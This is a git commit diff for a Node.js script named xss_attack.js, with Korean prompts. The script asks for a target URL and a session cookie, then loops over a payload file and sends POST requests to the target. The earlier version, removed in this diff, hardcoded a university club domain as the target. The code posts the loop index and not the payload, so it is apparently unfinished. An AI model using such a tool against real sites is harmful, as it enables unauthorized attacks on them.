a4cf926f320c427db3c8d24c33c77f7c050e5598
CyberSecurityHat <godofwhiteworld@gmail.com>
2023-04-16 14:34:09 +0900

    2023-04-16_CyberSecurityHat

--- xss_attack.js
+++ xss_attack.js
@@ -1,14 +1,33 @@
 const fs = require('fs');
+const readline = require('readline');
+const request = require('request');
 
-const url = 'http://cuha.cju.ac.kr';
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
 
-const array = fs.readFileSync('payload.txt').toString().split("\n");
-
-for(i in array) {
-    // console.log( i + '번째 payload 입니다 : ' + array[i]);
-    let victim_url = url + array[i];
-    console.log(victim_url);
-
-    //url 받고 query 날리는 로직 짜면됨
-
-}
+rl.question("URL을 입력해주세요 : ", (url) => {
+    rl.question("쿠키 값을 입력해주세요 : ", (cookie_val) => {
+        const array = fs.readFileSync('payload.txt').toString().split("\n");
+        for (let i in array) {
+            let victim_url = url + array[i];
+            console.log(victim_url);
+            const options = {
+                url: url,
+                headers: {
+                    'Cookie': cookie_val
+                },
+                form: {
+                    data: i
+                }
+            };
+            request.post(options, function(error, response, body) {
+                if (!error && response.statusCode == 200) {
+                    console.log(body);
+                }
+            });
+        }
+        rl.close();
+    });
+});
